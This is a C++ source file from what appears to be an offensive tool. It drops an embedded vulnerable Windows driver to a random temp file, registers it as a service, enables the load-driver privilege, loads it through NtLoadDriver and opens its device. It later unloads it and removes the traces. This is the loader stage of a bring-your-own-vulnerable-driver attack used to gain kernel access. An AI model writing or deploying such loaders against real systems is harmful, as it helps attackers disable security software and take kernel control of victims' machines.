#include "vuln_driver_loader.hpp"

#include "drivers/basic_vuln_driver.hpp"
#include "service_registry.hpp"

#include <print>
#include <utils/fs_utils.hpp>
#include <windows.h>

VulnDriverLoader::VulnDriverLoader(std::unique_ptr<BasicVulnDriver> driver)
    : isLoaded(false)
    , drvPath(Utils::FS::GenerateRandomTempPath(".tmp"))
    , ntPath(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + drvPath.stem().wstring())
    , driver(std::move(driver))
    , registry(std::make_unique<ServiceRegistry>(drvPath))
{
}

VulnDriverLoader::~VulnDriverLoader()
{
    if (isLoaded) {
        Unload();
    }
}

bool VulnDriverLoader::Load()
{
    if (!Utils::FS::CreateFileFromMemory(drvPath, driver->GetData())) {
        std::println("[-] Failed to create vulnerable driver");
        return false;
    }

    if (!registry->CreateRegistryEntry()) {
        std::println("[-] Failed to create registry entry");
        return false;
    }

    UNICODE_STRING svcName;
    RtlInitUnicodeString(&svcName, ntPath.c_str());

    NTSTATUS status = NtLoadDriver(&svcName);
    if (!NT_SUCCESS(status)) {
        std::println("[-] NtLoadDriver failed: 0x{:08X}", static_cast<ULONG>(status));
        return false;
    }

    if (!driver->OpenDevice()) {
        std::println("[-] Failed to open driver device");
        return false;
    }

    isLoaded = true;
    return true;
}

bool VulnDriverLoader::Unload()
{
    UNICODE_STRING svcName;
    RtlInitUnicodeString(&svcName, ntPath.c_str());

    NTSTATUS status = NtUnloadDriver(&svcName);
    if (!NT_SUCCESS(status)) {
        std::println("[-] NtUnloadDriver failed: 0x{:08X}", static_cast<ULONG>(status));
        return false;
    }

    if (!registry->DeleteRegistryEntry()) {
        std::println("[-] Failed to delete registry entry");
        return false;
    }

    driver->CloseDevice();

    std::error_code ec;
    std::filesystem::remove(drvPath, ec);
    if (ec) {
        std::println("[-] Failed to remove driver file: {}", ec.message());
        return false;
    }

    isLoaded = false;
    return true;
}

bool EnableLoadPrivilege()
{
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::println("[-] Failed to open process token");
        return false;
    }

    LUID luid;
    if (!LookupPrivilegeValueA(NULL, SE_LOAD_DRIVER_NAME, &luid)) {
        CloseHandle(hToken);
        std::println("[-] Failed to lookup privilege value");
        return false;
    }

    TOKEN_PRIVILEGES tp = { };
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        std::println("[-] Failed to adjust token privileges");
        return false;
    }

    CloseHandle(hToken);
    return true;
}
